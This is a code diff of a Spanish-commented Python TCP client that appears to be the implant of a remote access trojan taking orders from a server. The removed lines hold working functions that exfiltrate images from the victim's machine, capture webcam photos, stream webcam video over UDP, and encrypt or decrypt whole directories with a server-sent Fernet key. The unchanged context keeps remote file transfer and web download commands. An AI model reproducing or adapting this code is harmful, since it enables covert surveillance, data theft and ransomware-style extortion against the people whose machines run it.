@@ -5,14 +5,10 @@ import re
 import pickle
 import struct
 import requests
-import cv2
 import platform
 from time import sleep
 from subprocess import Popen, PIPE
 from zipfile import ZipFile
-from cryptography.fernet import Fernet
-from random import randint
-from udp import UDP
 
 # Clase client-TCP
 class TCP:
@@ -58,19 +54,6 @@ class TCP:
         nombre = os.path.abspath(ubicacion)
         nombre = os.path.basename(nombre)
         return nombre
-
-    # Funcion para regresar si un archivo es una imagen
-    # ubicacion --> ubicacion del archivo
-    def isImage(self, ubicacion):
-        ext = [".jpg", ".png", ".jpeg", ".webp"]
-        imagen = False
-        for i in ext:
-            if ubicacion.lower().endswith(i):
-                imagen = True
-                break
-
-        # Se regresa si el archivo es imagen o no
-        return imagen
 
     # Funcion para enviar datos
     # info --> informacion a enviar
@@ -268,86 +251,6 @@ class TCP:
             self.__sock.send("ok".encode())
             self.recibirArchivo(destino)
 
-    # Funcion para enviar una imagen al servidor
-    # cmd --> comando recibido
-    def image(self, cmd):
-        if re.search("-r[= ]", cmd):
-            imagenes = []
-            for i in os.listdir(os.getcwd()):
-                archivo = f"{os.getcwd()}/{i}"
-                if os.path.isfile(archivo) and self.isImage(archivo):
-                    imagenes.append(archivo)
-
-            num = randint(0, len(imagenes)-1)
-            imagen = imagenes[num]
-
-        else:
-            if re.search("-t[= ]", cmd):
-                imagen = re.findall("-i[= ]([a-zA-Z0-9./ ].*) -t", cmd)[0]
-            else:
-                imagen = re.findall("-i[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
-
-        if os.path.isfile(imagen) and self.isImage(imagen):
-            self.__sock.send("ok".encode())
-            
-            ok = self.__sock.recv(8)
-            nombre = self.getNombre(imagen)
-            self.__sock.send(nombre.encode())
-
-            ok = self.__sock.recv(8)
-            archivo = open(imagen, 'rb')
-            info = archivo.read()
-            archivo.close()
-            self.enviarDatos(info)
-
-        else:
-            self.__sock.send(f"error: Imagen \"{imagen}\" no encontrada".encode())
-
-    # Funcion para tomar una foto y enviarla al servidor
-    # cmd --> comando recibido
-    def pic(self, cmd):
-        camara = int(re.findall("-c[= ]([0-9].*)", cmd)[0])
-        captura = cv2.VideoCapture(camara, cv2.CAP_DSHOW)
-
-        leido, frame = captura.read()
-        captura.release()
-
-        if leido:
-            self.__sock.send("ok".encode())
-
-            ok = self.__sock.recv(8)
-            frame = cv2.imencode(".jpg", frame)[1]
-            self.enviarDatos(frame)
-        
-        else:
-            self.__sock.send(f"error: Camara \"{camara}\" no encontrada".encode())
-
-    # Funcion para enviar video de la camara al servidor
-    # cmd --> comando recibido
-    def captura(self, cmd):
-        camara = int(re.findall("-c[= ]([0-9. ].*)", cmd)[0])
-        udp = UDP(self.__host, self.__port)
-
-        captura = cv2.VideoCapture(camara, cv2.CAP_DSHOW)
-        leido = captura.read()[0]
-
-        if leido:
-            self.__sock.send("ok".encode())
-            try:
-                udp.conectar()
-                ok = self.__sock.recv(8)
-                udp.captura(camara)
-                udp.close()
-                captura.release()
-                self.__sock.send("client-UDP desconectado".encode())
-            except:
-                udp.close()
-                captura.release()
-                self.__sock.send("client-UDP desconectado".encode())
-        else:
-            self.__sock.send(f"error: Camara \"{camara}\" no encontrada".encode())
-            captura.release()
-
     # Funcion para enviar un directorio al servidor
     # cmd --> comando recibido
     def sendDirFrom(self, cmd):
@@ -502,115 +405,6 @@ class TCP:
             self.__sock.send(f"{descomprimidos} elementos descomprimidos".encode())
         else:
             self.__sock.send(f"error: Archivo \"{origen}\" no encontrado".encode())
-
-    # Funcion para encriptar un directorio
-    # cmd --> comando recibido
-    def encrypt(self, cmd):
-        self.__sock.send("ok".encode())
-        key = self.__sock.recv(1024)
-        directorio = re.findall("-e[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
-
-        if os.path.isdir(directorio):
-            nombre = self.getNombre(directorio)
-            self.__sock.send(f"ok\n{nombre}".encode())
-
-            res = self.__sock.recv(8).decode()
-            if res == 'S':
-                try:
-                    archivos = []
-                    for i in os.listdir(directorio):
-                        archivo = f"{directorio}/{i}"
-                        if os.path.isfile(archivo):
-                            archivos.append(archivo)
-
-                    with open(f"{directorio}/.info.dat", 'w') as texto:
-                        f = Fernet(key)
-                        cont = 0
-                        for i in archivos:
-                            nombre = os.path.basename(i)
-                            peso = os.path.getsize(i)
-                            if peso > 0:
-                                with open(i, 'rb') as archivo:
-                                    data = archivo.read()
-                                archivo.close()
-
-                                dataEncrypt = f.encrypt(data)
-
-                                with open(i, 'wb') as archivo:
-                                    archivo.write(dataEncrypt)
-                                archivo.close()
-                                texto.write(f"[+] Archivo \"{nombre}\" encriptado\n")
-                                cont += 1
-                    texto.close()
-
-                    self.__sock.send(f"{cont} archivos encriptados".encode())
-                    ok = self.__sock.recv(8)
-                    self.enviarArchivo(f"{directorio}/.info.dat")
-                    os.remove(f"{directorio}/.info.dat")
-
-                except:
-                    self.__sock.send("error: Error en el proceso de encriptacion".encode())
-
-            else:
-                self.__sock.send("Encriptacion cancelada".encode())
-
-        else:
-            self.__sock.send(f"error: Directorio \"{directorio}\" no encontrado".encode())
-
-    # Funcion para desencriptar un directorio
-    # cmd --> comando recibido
-    def decrypt(self, cmd):
-        self.__sock.send("ok".encode())
-        key = self.__sock.recv(1024)
-        directorio = re.findall("-d[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
-
-        if os.path.isdir(directorio):
-            nombre = self.getNombre(directorio)
-            self.__sock.send(f"ok\n{nombre}".encode())
-
-            res = self.__sock.recv(8).decode()
-            if res == 'S':
-                try:
-                    archivos = []
-                    for i in os.listdir(directorio):
-                        archivo = f"{directorio}/{i}"
-                        if os.path.isfile(archivo):
-                            archivos.append(archivo)
-
-                    with open(f"{directorio}/.info.dat", 'w') as texto:
-                        f = Fernet(key)
-                        cont = 0
-                        for i in archivos:
-                            nombre = os.path.basename(i)
-                            peso = os.path.getsize(i)
-                            if peso > 0:
-                                with open(i, 'rb') as archivo:
-                                    data = archivo.read()
-                                archivo.close()
-
-                                dataDecrypt = f.decrypt(data)
-
-                                with open(i, 'wb') as archivo:
-                                    archivo.write(dataDecrypt)
-                                archivo.close()
-
-                                texto.write(f"[+] Archivo \"{nombre}\" desencriptado\n")
-                                cont += 1
-                    texto.close()
-
-                    self.__sock.send(f"{cont} archivos desencriptados".encode())
-                    ok = self.__sock.recv(8)
-                    self.enviarArchivo(f"{directorio}/.info.dat")
-                    os.remove(f"{directorio}/.info.dat")
-
-                except:
-                    self.__sock.send("error: Error en el proceso de desencriptacion".encode())
-
-            else:
-                self.__sock.send("Desencriptacion cancelada".encode())
-
-        else:
-            self.__sock.send(f"error: Directorio \"{directorio}\" no encontrado".encode())
 
     # Funcion para descargar archivos web
     # cmd --> comando recibido
